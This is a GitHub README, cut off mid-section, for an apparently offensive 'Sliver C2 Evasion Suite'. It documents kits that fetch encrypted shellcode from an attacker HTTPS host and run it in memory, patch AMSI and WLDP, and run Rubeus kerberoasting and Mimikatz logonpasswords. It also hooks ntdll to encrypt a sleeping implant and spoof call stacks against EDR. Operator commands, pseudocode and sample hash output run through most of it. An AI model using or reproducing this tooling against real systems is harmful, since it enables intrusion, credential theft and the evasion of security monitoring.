# https://github.com/Squ1shification/SliverC2-Evasion-Suite

[Skip to content](https://github.com/Squ1shification/SliverC2-Evasion-Suite#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/Squ1shification/SliverC2-Evasion-Suite) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/Squ1shification/SliverC2-Evasion-Suite) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/Squ1shification/SliverC2-Evasion-Suite) to refresh your session.Dismiss alert

{{ message }}

[Squ1shification](https://github.com/Squ1shification)/ **[SliverC2-Evasion-Suite](https://github.com/Squ1shification/SliverC2-Evasion-Suite)** Public

- [Notifications](https://github.com/login?return_to=%2FSqu1shification%2FSliverC2-Evasion-Suite) You must be signed in to change notification settings
- [Fork\\
18](https://github.com/login?return_to=%2FSqu1shification%2FSliverC2-Evasion-Suite)
- [Star\\
94](https://github.com/login?return_to=%2FSqu1shification%2FSliverC2-Evasion-Suite)


main

[**1** Branch](https://github.com/Squ1shification/SliverC2-Evasion-Suite/branches) [**2** Tags](https://github.com/Squ1shification/SliverC2-Evasion-Suite/tags)

[Go to Branches page](https://github.com/Squ1shification/SliverC2-Evasion-Suite/branches)[Go to Tags page](https://github.com/Squ1shification/SliverC2-Evasion-Suite/tags)

Go to file

Code

Open more actions menu

## Latest commit

[![Squ1shification](https://avatars.githubusercontent.com/u/151489388?v=4&size=40)](https://github.com/Squ1shification)[Squ1shification](https://github.com/Squ1shification/SliverC2-Evasion-Suite/commits?author=Squ1shification)

[Update README with comprehensive documentation from portfolio](https://github.com/Squ1shification/SliverC2-Evasion-Suite/commit/36670abe482ef2a9d0930c3b9c0f3e7f6eeebfe4)

last monthJul 21, 2026

[36670ab](https://github.com/Squ1shification/SliverC2-Evasion-Suite/commit/36670abe482ef2a9d0930c3b9c0f3e7f6eeebfe4) · last monthJul 21, 2026

## History

[6 Commits](https://github.com/Squ1shification/SliverC2-Evasion-Suite/commits/main/)

Open commit details

[View commit history for this file.](https://github.com/Squ1shification/SliverC2-Evasion-Suite/commits/main/) 6 Commits

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| [Crystal-Palace-Kit](https://github.com/Squ1shification/SliverC2-Evasion-Suite/tree/main/Crystal-Palace-Kit "Crystal-Palace-Kit") | [Crystal-Palace-Kit](https://github.com/Squ1shification/SliverC2-Evasion-Suite/tree/main/Crystal-Palace-Kit "Crystal-Palace-Kit") | [PalaceKit: functional DFR + addhook + ChaCha20](https://github.com/Squ1shification/SliverC2-Evasion-Suite/commit/9ca7df758e08619bf315bf786d0998f56f20f147 "PalaceKit: functional DFR + addhook + ChaCha20  Crystal Palace's headline feature (DFR-based attach/preserve hooking) was previously stubbed. This change makes it real:  - attach   \"DLL$FUNC\" \"_local\"  → linker rewrites unresolved MODULE$FUNC                                   externs to local hooks at link time. - preserve \"DLL$FUNC\" \"fn\"      → exempts calls inside fn from the rewrite                                   so the hook can reach the real API. - Unattached DFR symbols get a generated 22-byte PEB-resolver thunk that   calls patch_resolve(ror13_hash) and tail-jumps to the resolved API. - C loader source migrated from global function pointers to DFR convention   (NTDLL$NtAllocateVirtualMemory(...) style). - hooks.c gains a sample _HookedNtAllocateVirtualMemory demonstrating   attach + preserve round-tripping.  PICO architecture is real now: - PICO blob format v2 carries a runtime addhook table after the code. - addhook \"DLL$FUNC\" \"_local\" appends a ror13-keyed entry to the table. - pico.c implements __resolve_hook(hash) that walks the table for   dispatch-time hooking; pico_set_bases() wires up the loader.  ChaCha20-IETF encryption alternative to XOR: - chacha20 $KEY $NONCE spec directive (32-byte key, 12-byte nonce). - C-side decryption (loader.c) verified byte-identical against the   golang.org/x/crypto/chacha20 implementation. - New \"nonce\" named section + MAGIC_NONCE so the loader detects mode.  Linker correctness: - pendingReloc tracks externName for unresolved externs so resolveDFR can   look them up by name in the attach map. - Function-range tracking lets preserve scope exemptions by containing   function (using sorted text-section symbol marks). - +gofirst rotation runs AFTER DFR resolution so emitted thunks rotate   correctly; ADDR64 fixups are applied against post-rotation offsets.  Verbose mode (palacekit build -v) prints every DFR decision and PICO assembly summary.") | 2 months agoJun 17, 2026 |
| [Inject-Kit](https://github.com/Squ1shification/SliverC2-Evasion-Suite/tree/main/Inject-Kit "Inject-Kit") | [Inject-Kit](https://github.com/Squ1shification/SliverC2-Evasion-Suite/tree/main/Inject-Kit "Inject-Kit") | [Fix URL path confusion, encryption labels, and doc errors across all …](https://github.com/Squ1shification/SliverC2-Evasion-Suite/commit/8938b30ffd809d79d5d6bf11c2632cee52e3d3b9 "Fix URL path confusion, encryption labels, and doc errors across all kits  - All --serve commands now take https://IP:PORT only; random path auto-generated   and printed before server starts (CrystalKit, SleepKit, LoadKit, InjectKit) - Fixed compile-time URL mismatch bug: server path generated before cross-compile   so stager/mask.exe and server always share the same URL - Corrected encryption label: ChaCha20-Poly1305 (not XOR) in SleepKit docs - Corrected transport label: Go net/http/InsecureSkipVerify (not WinHTTP) - Fixed architecture diagram: unity build (loader.x64.o via unity.c, not 8 separate objects) - Fixed gen-hashes output: all 13 functions with correct hashes (was showing 10) - Fixed serve command: crystalkit serve (not crystalkit stage --serve --payload) - Fixed spec DSL: make pic +gofirst +optimize (not +gofirst); removed services.x64.o merge - Fixed COFF object count: 6 objects (not 8) - Fixed tarball structure: loadkit extension at root (not load/ subdirectory) - Removed hardcoded /home/kali/ paths from SleepKit and CrystalKit READMEs - Fixed palacekit output size: 4218 bytes consistent with DOCUMENTATION") | 2 months agoJun 15, 2026 |
| [Loader-Kit](https://github.com/Squ1shification/SliverC2-Evasion-Suite/tree/main/Loader-Kit "Loader-Kit") | [Loader-Kit](https://github.com/Squ1shification/SliverC2-Evasion-Suite/tree/main/Loader-Kit "Loader-Kit") | [Fix URL path confusion, encryption labels, and doc errors across all …](https://github.com/Squ1shification/SliverC2-Evasion-Suite/commit/8938b30ffd809d79d5d6bf11c2632cee52e3d3b9 "Fix URL path confusion, encryption labels, and doc errors across all kits  - All --serve commands now take https://IP:PORT only; random path auto-generated   and printed before server starts (CrystalKit, SleepKit, LoadKit, InjectKit) - Fixed compile-time URL mismatch bug: server path generated before cross-compile   so stager/mask.exe and server always share the same URL - Corrected encryption label: ChaCha20-Poly1305 (not XOR) in SleepKit docs - Corrected transport label: Go net/http/InsecureSkipVerify (not WinHTTP) - Fixed architecture diagram: unity build (loader.x64.o via unity.c, not 8 separate objects) - Fixed gen-hashes output: all 13 functions with correct hashes (was showing 10) - Fixed serve command: crystalkit serve (not crystalkit stage --serve --payload) - Fixed spec DSL: make pic +gofirst +optimize (not +gofirst); removed services.x64.o merge - Fixed COFF object count: 6 objects (not 8) - Fixed tarball structure: loadkit extension at root (not load/ subdirectory) - Removed hardcoded /home/kali/ paths from SleepKit and CrystalKit READMEs - Fixed palacekit output size: 4218 bytes consistent with DOCUMENTATION") | 2 months agoJun 15, 2026 |
| [Sleep-Mask-Kit](https://github.com/Squ1shification/SliverC2-Evasion-Suite/tree/main/Sleep-Mask-Kit "Sleep-Mask-Kit") | [Sleep-Mask-Kit](https://github.com/Squ1shification/SliverC2-Evasion-Suite/tree/main/Sleep-Mask-Kit "Sleep-Mask-Kit") | [Fix URL path confusion, encryption labels, and doc errors across all …](https://github.com/Squ1shification/SliverC2-Evasion-Suite/commit/8938b30ffd809d79d5d6bf11c2632cee52e3d3b9 "Fix URL path confusion, encryption labels, and doc errors across all kits  - All --serve commands now take https://IP:PORT only; random path auto-generated   and printed before server starts (CrystalKit, SleepKit, LoadKit, InjectKit) - Fixed compile-time URL mismatch bug: server path generated before cross-compile   so stager/mask.exe and server always share the same URL - Corrected encryption label: ChaCha20-Poly1305 (not XOR) in SleepKit docs - Corrected transport label: Go net/http/InsecureSkipVerify (not WinHTTP) - Fixed architecture diagram: unity build (loader.x64.o via unity.c, not 8 separate objects) - Fixed gen-hashes output: all 13 functions with correct hashes (was showing 10) - Fixed serve command: crystalkit serve (not crystalkit stage --serve --payload) - Fixed spec DSL: make pic +gofirst +optimize (not +gofirst); removed services.x64.o merge - Fixed COFF object count: 6 objects (not 8) - Fixed tarball structure: loadkit extension at root (not load/ subdirectory) - Removed hardcoded /home/kali/ paths from SleepKit and CrystalKit READMEs - Fixed palacekit output size: 4218 bytes consistent with DOCUMENTATION") | 2 months agoJun 15, 2026 |
| [.gitignore](https://github.com/Squ1shification/SliverC2-Evasion-Suite/blob/main/.gitignore ".gitignore") | [.gitignore](https://github.com/Squ1shification/SliverC2-Evasion-Suite/blob/main/.gitignore ".gitignore") | [fix: untrack build tarballs and broaden build/ gitignore pattern](https://github.com/Squ1shification/SliverC2-Evasion-Suite/commit/c725fc7a29b05cfd4c8c6182b3761a9473673ebe "fix: untrack build tarballs and broaden build/ gitignore pattern  */build/ only matched one level deep; kit build dirs sit two levels in. Changed to build/ which matches at any depth in the tree.") | 2 months agoJun 14, 2026 |
| [README.md](https://github.com/Squ1shification/SliverC2-Evasion-Suite/blob/main/README.md "README.md") | [README.md](https://github.com/Squ1shification/SliverC2-Evasion-Suite/blob/main/README.md "README.md") | [Update README with comprehensive documentation from portfolio](https://github.com/Squ1shification/SliverC2-Evasion-Suite/commit/36670abe482ef2a9d0930c3b9c0f3e7f6eeebfe4 "Update README with comprehensive documentation from portfolio") | last monthJul 21, 2026 |
| View all files |

## Repository files navigation

# Sliver C2 Evasion Suite

[Permalink: Sliver C2 Evasion Suite](https://github.com/Squ1shification/SliverC2-Evasion-Suite#sliver-c2-evasion-suite)

A modular evasion suite for the Sliver C2 framework — in-memory execution, sleep masking, and a Crystal Palace replacement.

## 1\. Introduction

[Permalink: 1. Introduction](https://github.com/Squ1shification/SliverC2-Evasion-Suite#1-introduction)

### 1.1 Overview

[Permalink: 1.1 Overview](https://github.com/Squ1shification/SliverC2-Evasion-Suite#11-overview)

The Sliver C2 Evasion Suite is a modular set of three operator kits that bring Cobalt Strike-style evasion tradecraft to the open-source **Sliver** C2 framework. Each kit targets a different surface that EDRs scan: on-disk artefacts during tool execution, sleeping shellcode in memory, and shellcode loader fingerprints with importable APIs and PE structure.

The suite is written in **Go** (operator CLIs) and **C** (target-side shellcode and DLL extensions). All four kits are self-contained.

### 1.2 The Four Kits

[Permalink: 1.2 The Four Kits](https://github.com/Squ1shification/SliverC2-Evasion-Suite#12-the-four-kits)

| Kit | Problem it solves | Cobalt Strike analogue | Output |
| --- | --- | --- | --- |
| **Loader Kit** | Running native EXEs, native DLLs, and .NET assemblies in-memory from an active Sliver session, with stdout/stderr returned to the console — no disk writes, no new processes. | `execute-assembly`, `shinject`, `dllload` | Sliver extension `load.x64.dll` \+ operator CLI `loadkit` |
| **Sleep Mask Kit** | Hiding Sliver's shellcode in memory during the C2 sleep window, when EDR memory scanners are most likely to fire. Encrypts the region, drops execute bit, optionally spoofs the call stack. | CS Sleep Mask Kit (`BEACON_SLEEP_MASK` callback) | Two implementations: `maskkit` (raw shellcode) and `sleepkit` (Windows EXE) |
| **Crystal Palace Kit** | Producing PIC shellcode with no IAT, no PE headers, ROR13 API hashing, ChaCha20-Poly1305 staging — without paying for or relying on the closed-source Crystal Palace Java linker. | Crystal Palace + Crystal Kit (operator-licensed) | Free Go-based COFF linker `palacekit` \+ operator workflow `crystalkit` |
| **Inject Kit** | Remote process injection with PPID spoofing — moves shellcode from the injector into a legitimate host process. Works standalone (no Sliver session) and as a Sliver extension for lateral movement. | CS `shinject`, PPID-spoof spawning | Standalone Windows EXE `injectkit.exe` \+ Sliver extension `inject.x64.dll` \+ operator CLI `injectkit` |

* * *

## 2\. Loader Kit

[Permalink: 2. Loader Kit](https://github.com/Squ1shification/SliverC2-Evasion-Suite#2-loader-kit)

Loader Kit gives Sliver an equivalent of Cobalt Strike's `execute-assembly`. From an active session you can run a .NET EXE (Rubeus, SharpHound, Certify), a native EXE (Mimikatz, WinPEAS), or a DLL with a specific export — all in-memory inside the existing Sliver agent process, with the tool's stdout/stderr piped back to the Sliver console.

### 2.1 The Two Halves

[Permalink: 2.1 The Two Halves](https://github.com/Squ1shification/SliverC2-Evasion-Suite#21-the-two-halves)

**Operator CLI — `loadkit` (Go)**

Runs on the attacker machine. Converts the target binary to shellcode using [Donut](https://github.com/TheWover/donut), XOR-32 encrypts it with a fresh random key, and serves the encrypted payload once over self-signed HTTPS.

**Extension DLL — `load.x64.dll` (C, cross-compiled with mingw-w64)**

Installed once into Sliver via the standard extension mechanism. On invocation it fetches the encrypted payload via WinHTTP, XOR-decrypts it, allocates RW → copies → marks RX (never RWX), redirects stdout/stderr to a pipe, executes the Donut shellcode via `NtCreateThreadEx`, and returns the captured output to the operator console.

### 2.2 Build Pipeline

[Permalink: 2.2 Build Pipeline](https://github.com/Squ1shification/SliverC2-Evasion-Suite#22-build-pipeline)

```
Operator side:

  binary.exe ──[go-donut]──▶ donut_shellcode.bin
                              │   (AMSI+WLDP bypass=3,
                              │    Chaskey-CTR strings=3,
                              │    ExitOpt=1 → thread, not process)
                              ▼
                       XOR-32 encrypt
                       (random 32-byte key)
                              │
                              ▼
                       payload.enc + key (hex)
                              │
                              ▼
                   One-shot HTTPS server
                   (self-signed ECDSA P-256,
                    random URL path, dies 500ms after first fetch)
```

### 2.3 Target-Side Execution

[Permalink: 2.3 Target-Side Execution](https://github.com/Squ1shification/SliverC2-Evasion-Suite#23-target-side-execution)

```
load.x64.dll running inside the Sliver agent process:

 1. LoadLibraryA("winhttp.dll") + GetProcAddress for each WinHttp function
    └─ keeps winhttp off the static import table
 2. HTTPS GET → encrypted bytes (cert errors ignored)
 3. XOR decrypt with operator-supplied key
 4. NtAllocateVirtualMemory(PAGE_READWRITE)
 5. memcpy decrypted shellcode → allocation
 6. NtProtectVirtualMemory(PAGE_EXECUTE_READ)         ← no RWX
 7. CreatePipe → SetStdHandle(stdout, stderr)         ← capture output
 8. NtCreateThreadEx(allocation)                      ← Donut runs
       │
       ▼
       For .NET assemblies:
         find/load mscoree.dll, CLRCreateInstance,
         patch amsi!AmsiScanBuffer (AMSI_CLEAN),
         patch wldp!WldpQueryDynamicCodeTrust (S_OK),
         AppDomain.Load(bytes) → EntryPoint.Invoke(args)
       For native PE:
         map sections, apply relocations, resolve IAT,
         call AddressOfEntryPoint
 9. WaitForSingleObject(thread, 5min)
10. ReadFile(pipe) → output bytes
11. callback(output) → Sliver console
```

### 2.4 Operator Workflow

[Permalink: 2.4 Operator Workflow](https://github.com/Squ1shification/SliverC2-Evasion-Suite#24-operator-workflow)

```
# First time only — install the extension into Sliver
sliver (TARGET)> extensions install build/load-0.1.0.tar.gz

# Convert + encrypt + serve in one shot
./loadkit load \
    --binary Rubeus.exe \
    --args "kerberoast /nowrap" \
    --url https://192.162.1.10:8443 \
    --serve

# The output prints the complete Sliver command with the real URL.
# Copy and paste it — the path is auto-generated and only that URL works:
#   sliver (TARGET)> load url=https://192.162.1.10:8443/a3f91c04b2e8d17f key=a1b2c3d4...
```

### 2.5 Evasion Techniques in Loader Kit

[Permalink: 2.5 Evasion Techniques in Loader Kit](https://github.com/Squ1shification/SliverC2-Evasion-Suite#25-evasion-techniques-in-loader-kit)

- **No disk writes on the target.** The encrypted payload lives only on the operator machine and is fetched into memory.
- **AMSI + WLDP bypass (Donut bypass=3)** — `AmsiScanBuffer` patched to return `AMSI_RESULT_CLEAN`; `WldpQueryDynamicCodeTrust` patched to return `S_OK`. Patches are applied to the in-memory copy of the DLLs, not the files on disk.
- **Chaskey-CTR module encryption (entropy=3)** — every import string, symbol name, and module name inside the Donut shellcode is encrypted. Static analysis sees no `"Rubeus"`, `"mscoree.dll"`, or `"CLRCreateInstance"`.
- **NT-native APIs.** The extension calls `NtAllocateVirtualMemory`, `NtProtectVirtualMemory`, and `NtCreateThreadEx` resolved at runtime via `GetProcAddress` on `ntdll`. Hooks on Win32 wrappers are bypassed.
- **Dynamic WinHTTP loading.**`winhttp.dll` isn't on the static import list — the DLL looks less like network-fetch tooling to a static scan.
- **No RWX pages.** Allocate `PAGE_READWRITE`, copy + decrypt, flip to `PAGE_EXECUTE_READ`. Many EDRs flag RWX allocations as shellcode injection.
- **Donut `ExitOpt=1`.** The shellcode calls `ExitThread` on completion, not `ExitProcess` — running Rubeus doesn't kill the Sliver agent.
- **One-shot HTTPS server.** The payload URL dies 500ms after the first successful fetch. A defender who finds the URL in network logs and replays it gets a 404.
- **XOR-32 layer beyond TLS.** Even if TLS were stripped, the wire payload is encrypted shellcode — the key is provided in-band as a Sliver command argument, never persisted on target.

### 2.6 Supported Binary Types

[Permalink: 2.6 Supported Binary Types](https://github.com/Squ1shification/SliverC2-Evasion-Suite#26-supported-binary-types)

| Type | Examples | Notes |
| --- | --- | --- |
| .NET EXE (any version) | Rubeus, SharpHound, Certify, SharpView, ADSearch | Most common use case |
| .NET DLL | PowerView, SharpDPAPI | `--method DllMain` or a specific export |
| Native x64 EXE | WinPEAS, Mimikatz, Seatbelt | Must be x64; output capture is stdout/stderr only |
| Native x64 DLL | Mimikatz.dll | `--method sekurlsa::logonpasswords` etc. |

### 2.7 Full Usage

[Permalink: 2.7 Full Usage](https://github.com/Squ1shification/SliverC2-Evasion-Suite#27-full-usage)

#### 2.7.1 One-Time Setup — Install the Extension

[Permalink: 2.7.1 One-Time Setup — Install the Extension](https://github.com/Squ1shification/SliverC2-Evasion-Suite#271-one-time-setup--install-the-extension)

The extension is installed once per Sliver server instance and persists across sessions. You don't need to reinstall before every run. The tarball contains a flat root structure: `./extension.json` and `./load.x64.dll`.

```
cd Loader-Kit/loadkit
make bundle                           # produces build/load-0.1.0.tar.gz
```

```
sliver (TARGET)> extensions install build/load-0.1.0.tar.gz

[*] Installing extension 'load' (v0.1.0) ... done
```

#### 2.7.2 Running a .NET Assembly (Rubeus, SharpHound, Certify, ...)

[Permalink: 2.7.2 Running a .NET Assembly (Rubeus, SharpHound, Certify, ...)](https://github.com/Squ1shification/SliverC2-Evasion-Suite#272-running-a-net-assembly-rubeus-sharphound-certify-)

```
# Step 1 — Prepare the payload (operator side)
cd Loader-Kit/loadkit

./loadkit load \
    --binary Rubeus.exe \
    --args "kerberoast /nowrap" \
    --url https://192.162.1.10:8443 \
    --serve

# --url only needs the scheme and host:port.
# The path is always auto-generated. Whatever you put after the port is ignored.
```

```
[*] Converting Rubeus.exe to Donut shellcode ...
[+] Shellcode: 1245184 bytes (AMSI+WLDP bypass, Chaskey-CTR module encryption)

[+] payload → build/payload.enc (1245200 bytes)
[+] key     → a1b2c3d4e5f6...

[i] First time (once per Sliver server):
    sliver> extensions install build/load-0.1.0.tar.gz

[*] One-shot HTTPS server on :8443 — shuts down after one download
[+] Staging URL: https://192.162.1.10:8443/a3f91c04b2e8d17f
    (random path generated automatically — only this URL works)

[i] Execute in Sliver:
    sliver (TARGET)> load url=https://192.162.1.10:8443/a3f91c04b2e8d17f key=a1b2c3d4e5f6...
```

The server hosts one encrypted blob at that single random URL. There is no directory listing and no way to find it by guessing. It serves exactly once and shuts down. Copy the `[i] Execute in Sliver:` line directly.

```
# Step 2 — Execute in Sliver (use the URL printed above, not the one you typed)
sliver (TARGET)> load url=https://192.162.1.10:8443/a3f91c04b2e8d17f key=a1b2c3d4e5f6...

[*] Waiting for output (timeout: 5m)...

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/   v2.2.3

[*] Action: Kerberoasting
[*] Total kerberoastable users : 2
[*] SamAccountName : svc_sql
$krb5tgs$23$*svc_sql$CORP.LOCAL$...HASH...*
```

#### 2.7.3 Running a Native EXE (WinPEAS, Mimikatz, Seatbelt, ...)

[Permalink: 2.7.3 Running a Native EXE (WinPEAS, Mimikatz, Seatbelt, ...)](https://github.com/Squ1shification/SliverC2-Evasion-Suite#273-running-a-native-exe-winpeas-mimikatz-seatbelt-)

```
./loadkit load \
    --binary winpeas.exe \
    --url https://192.162.1.10:8443 \
    --serve

# Copy the [i] Execute in Sliver: command from the output and paste it in.
# WinPEAS runs entirely in memory. The full enumeration output comes back to the console.
```

#### 2.7.4 Running a DLL with a Specific Export

[Permalink: 2.7.4 Running a DLL with a Specific Export](https://github.com/Squ1shification/SliverC2-Evasion-Suite#274-running-a-dll-with-a-specific-export)

```
./loadkit load \
    --binary mimikatz.dll \
    --method "sekurlsa::logonpasswords" \
    --url https://192.162.1.10:8443 \
    --serve

# Copy the [i] Execute in Sliver: command from the output and paste it in.
```

#### 2.7.5 Decoupled Build & Serve

[Permalink: 2.7.5 Decoupled Build & Serve](https://github.com/Squ1shification/SliverC2-Evasion-Suite#275-decoupled-build--serve)

Prepare the payload now and serve it later, for example from a redirector or a different machine:

```
# Step 1 — convert + encrypt only (no server)
./loadkit load \
    --binary rubeus.exe \
    --args "kerberoast /nowrap" \
    --url https://192.162.1.10:8443
# Writes build/payload.enc and prints the key.
# Run 'loadkit serve' separately when you are ready — that is when the random URL is generated.

# Step 2 — serve when ready; the output prints the random URL to use in Sliver
./loadkit serve --payload build/payload.enc --port 8443
```

#### 2.7.6 Staging Multiple Tools Concurrently

[Permalink: 2.7.6 Staging Multiple Tools Concurrently](https://github.com/Squ1shification/SliverC2-Evasion-Suite#276-staging-multiple-tools-concurrently)

```
# Terminal 1 — Rubeus on port 8443 (prints its own random URL)
./loadkit load --binary rubeus.exe --args "kerberoast /nowrap" \
    --url https://192.162.1.10:8443 --serve

# Terminal 2 — WinPEAS on port 8444 (prints its own random URL)
./loadkit load --binary winpeas.exe \
    --url https://192.162.1.10:8444 --serve

# In Sliver — use each URL that was printed above, not a fixed path
sliver (TARGET)> load url=https://192.162.1.10:8443/<random1> key=<key1>
sliver (TARGET)> load url=https://192.162.1.10:8444/<random2> key=<key2>
```

#### 2.7.7 Command Reference

[Permalink: 2.7.7 Command Reference](https://github.com/Squ1shification/SliverC2-Evasion-Suite#277-command-reference)

| Command | Flags | Purpose |
| --- | --- | --- |
| `loadkit load` | `--binary`, `--args`, `--method`, `--url`, `--serve`, `--port`, `-o` | Convert binary to shellcode, XOR-encrypt, optionally serve once |
| `loadkit build-ext` | `--output` | Cross-compile `load.x64.dll` from C source |
| `loadkit bundle` | `--output` | Package extension tarball for `extensions install` |
| `loadkit serve` | `--payload`, `--port` | Serve an already-built `payload.enc` once over HTTPS |
| Sliver: `load` | `url=<url> key=<64-hex>` | Extension command run inside the active session |

#### 2.7.8 Operational Notes

[Permalink: 2.7.8 Operational Notes](https://github.com/Squ1shification/SliverC2-Evasion-Suite#278-operational-notes)

- **One-shot server.** The HTTPS server shuts down 500ms after the first successful download. Each new run needs a new `payload.enc` — just re-run `loadkit load`.
- **Timeout.** The extension waits up to 5 minutes for the shellcode thread to complete. Long-running tools still work, but you won't see output until the tool finishes; the Sliver agent itself is independent of the shellcode thread.
- **Output size.** The output buffer is 4 MB. For very verbose tools, redirect to a file inside the tool (e.g. `/outfile:`) and pull it back with Sliver's `download`.
- **No output captured.** The tool ran but wrote nothing to stdout/stderr — common with BloodHound (writes JSON files) or GUI tools. Use `download` to fetch any files the tool wrote.
- **Don't use `--format shared`** when generating the Sliver implant for any of the kits — always `--format shellcode`. A DLL would start a second Go runtime inside the host process.

* * *

## 3\. Sleep Mask Kit

[Permalink: 3. Sleep Mask Kit](https://github.com/Squ1shification/SliverC2-Evasion-Suite#3-sleep-mask-kit)

All C2 implants sleep between callbacks. Sliver's default is 60 seconds with 10% jitter — 60 seconds every cycle during which the shellcode region sits in memory, executable, unencrypted, and scannable. Sleep Mask Kit closes that window: encrypt the region during sleep, drop the execute bit, restore both on wake.

Cobalt Strike has a built-in `BEACON_SLEEP_MASK` callback that operators can hook. Sliver has no equivalent. The kit provides two independent implementations, each handling the absence of that callback differently. **Both are the first-ever Sliver ports of the Sleep Mask Kit concept.**

### 3.1 The Scan Window Problem

[Permalink: 3.1 The Scan Window Problem](https://github.com/Squ1shification/SliverC2-Evasion-Suite#31-the-scan-window-problem)

```
Timeline (one Sliver callback cycle):

                    SC running      SC sleeping (scan window)    SC running
                  ┌──────────┐     ┌───────────────────────────┐  ┌──────────┐
[not allocated]   │ RX, plain│     │  ???  ← EDR scan target   │  │ RX, plain│
                  └──────────┘     └───────────────────────────┘  └──────────┘
                  ↑ SC starts      ↑ Sleep called               ↑ Wake

EDRs use four scanning strategies: signature scans (pattern match), heuristics
(executable memory not backed by a file), API hooks (catch the allocation),
and periodic memory scans (the scan window above).
```

### 3.2 MaskKit — Pure C, Raw Shellcode Output

[Permalink: 3.2 MaskKit — Pure C, Raw Shellcode Output](https://github.com/Squ1shification/SliverC2-Evasion-Suite#32-maskkit--pure-c-raw-shellcode-output)

MaskKit produces a flat `masked.bin` PIC shellcode that wraps the original Sliver shellcode. It has no PE headers, can be injected via any loader, and installs an inline hook on `ntdll!NtWaitForSingleObject` to intercept the C2 sleep call.

#### Payload Layout

[Permalink: Payload Layout](https://github.com/Squ1shification/SliverC2-Evasion-Suite#payload-layout)

```
masked.bin:

  [ MASKER SHELLCODE (PIC x64, ~3–4 KB) ]
  [ MAGIC: 0xB33FCAFE 0xDEAD1337         ]   8 bytes
  [ CONFIG: interval, threshold, key_len, sc_len ]   16 bytes
  [ XOR KEY (32 bytes, random per build)         ]
  [ XOR-ENCRYPTED SLIVER SHELLCODE (N bytes)     ]
```

#### Self-Location Trick (PIC)

[Permalink: Self-Location Trick (PIC)](https://github.com/Squ1shification/SliverC2-Evasion-Suite#self-location-trick-pic)

```
; Get current RIP at runtime — no relocations needed:
call  .next
.next:
pop   rax        ; rax = next instruction address
sub   rax, 5     ; rax = shellcode base address

; Then scan forward in C for the MAGIC marker to find the config block.
```

#### API Resolution — ROR13 PEB Walk

[Permalink: API Resolution — ROR13 PEB Walk](https://github.com/Squ1shification/SliverC2-Evasion-Suite#api-resolution--ror13-peb-walk)

```
uint32_t h = 0;
while (*name) {
    h = (h >> 13) | (h << 19);
    h += (uint8_t)(*name++);
}
```

#### The Inline Hook

[Permalink: The Inline Hook](https://github.com/Squ1shification/SliverC2-Evasion-Suite#the-inline-hook)

The masker writes a 12-byte JMP trampoline over the first 12 bytes of `NtWaitForSingleObject` in ntdll. A separate 32-byte trampoline buffer (in the masker's own RX memory) holds the displaced original bytes plus a `JMP` back to `(ntdll_stub + 12)` — so `_real_NtWaitForSingleObject` behaves identically to the unhooked function.

#### The Hook Decision — Filter by Wait Duration

[Permalink: The Hook Decision — Filter by Wait Duration](https://github.com/Squ1shification/SliverC2-Evasion-Suite#the-hook-decision--filter-by-wait-duration)

```
hook_NtWaitForSingleObject(handle, alertable, timeout):
  if (timeout == NULL)             return real(...);   // infinite wait
  if (timeout->QuadPart >= 0)      return real(...);   // absolute time
  if (already_masking)             return real(...);   // re-entrancy guard
  if (-timeout->QuadPart < THRESHOLD_100NS)
                                    return real(...);   // goroutine wait
  // Wait ≥ 5 seconds → C2 sleep
  mask_on();         // XOR + PAGE_READWRITE
  spoof_stack();     // replace return addr with ntdll RET gadget
  result = real(handle, alertable, timeout);
  restore_stack();
  mask_off();        // XOR + PAGE_EXECUTE_READ
  return result;
```

#### `NtWaitForSingleObject` Hook Rationale

[Permalink: NtWaitForSingleObject Hook Rationale](https://github.com/Squ1shification/SliverC2-Evasion-Suite#ntwaitforsingleobject-hook-rationale)

Sliver's Go runtime does _not_ call `kernel32!Sleep`. Go calls `NtWaitForSingleObject` / `NtDelayExecution` via direct syscall. Hooking `Sleep` would catch nothing. MaskKit hooks the Nt-level function directly, catching every wait Go performs.

#### Stack Spoofing

[Permalink: Stack Spoofing](https://github.com/Squ1shification/SliverC2-Evasion-Suite#stack-spoofing)

During sleep, the hook scans the current thread stack for the first return address pointing into the shellcode region and replaces it with a `RET` gadget from ntdll's `.text`. A call-stack-walking EDR sees a thread that "came from ntdll" rather than from an unknown shellcode region. The original return address is restored after the wait.

### 3.3 SleepKit — Go EXE, Standalone Windows Binary

[Permalink: 3.3 SleepKit — Go EXE, Standalone Windows Binary](https://github.com/Squ1shification/SliverC2-Evasion-Suite#33-sleepkit--go-exe-standalone-windows-binary)

SleepKit compiles to a Windows EXE (`mask.exe`) that downloads the encrypted Sliver shellcode from an HTTPS URL, decrypts it, and runs it under a Go-based masking harness. The masking logic uses Go goroutines, which makes it easy to extend and reason about.

#### The Two-Layer Strategy

[Permalink: The Two-Layer Strategy](https://github.com/Squ1shification/SliverC2-Evasion-Suite#the-two-layer-strategy)

Sliver's Go runtime sleeps via two paths:

| Path | Execution Flow |
| --- | --- |
| Path 1 | User code `time.Sleep(30*time.Second)` → `runtime.usleep` → `kernel32!Sleep` |
| Path 2 | Go scheduler internal timer → `NtWaitForSingleObject` directly |

SleepKit installs a 12-byte JMP hook on `kernel32!Sleep` to catch Path 1, and runs a timer goroutine that masks on a fixed schedule to catch Path 2.

#### Timer Goroutine

[Permalink: Timer Goroutine](https://github.com/Squ1shification/SliverC2-Evasion-Suite#timer-goroutine)

```
for {
    time.Sleep(interval)               // Go-internal sleep, not kernel32!Sleep
    ntdll.NtSuspendThread(scThread)    // freeze the shellcode thread
    for i := range shellcode { shellcode[i] ^= key[i%len(key)] }
    ntdll.NtProtectVirtualMemory(scBase, scSize, PAGE_READWRITE)
    time.Sleep(interval)               // [SCAN WINDOW: RW + encrypted]
    ntdll.NtProtectVirtualMemory(scBase, scSize, PAGE_EXECUTE_READ)
    for i := range shellcode { shellcode[i] ^= key[i%len(key)] }
    ntdll.NtResumeThread(scThread)
}
```

#### Recursion Guard on the `Sleep` Hook

[Permalink: Recursion Guard on the Sleep Hook](https://github.com/Squ1shification/SliverC2-Evasion-Suite#recursion-guard-on-the-sleep-hook)

